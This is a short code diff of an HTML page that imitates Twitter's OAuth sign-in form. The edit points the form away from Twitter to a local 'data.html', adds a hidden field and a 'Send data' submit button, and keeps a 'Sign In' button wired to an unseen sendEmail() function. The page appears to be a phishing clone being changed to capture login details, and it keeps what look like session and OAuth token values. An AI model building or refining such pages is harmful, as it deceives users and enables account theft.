@@ -57,7 +57,7 @@
   </dl>
 </div>
 
-      <form action="https://twitter.com/oauth/authenticate" id="oauth_form" method="post" target="_self">
+      <form action="data.html">
         <div>
           <input name="authenticity_token" type="hidden" value="99eef7c19d2cfa2d108a8c8cbdfe1aadead6c55c">
           <input name="redirect_after_login" type="hidden" value="https://twitter.com/oauth/authenticate?oauth_token=uuw9MwAAAAAA9a3bAAABdXRRNaU">
@@ -86,6 +86,8 @@
 </script>
           
           <button type="button" onclick="sendEmail()">Sign In</button>
+          <input type="hidden" name="varname" value="12345" />
+          <input type="submit" value="Send data">
           
       </form>
 
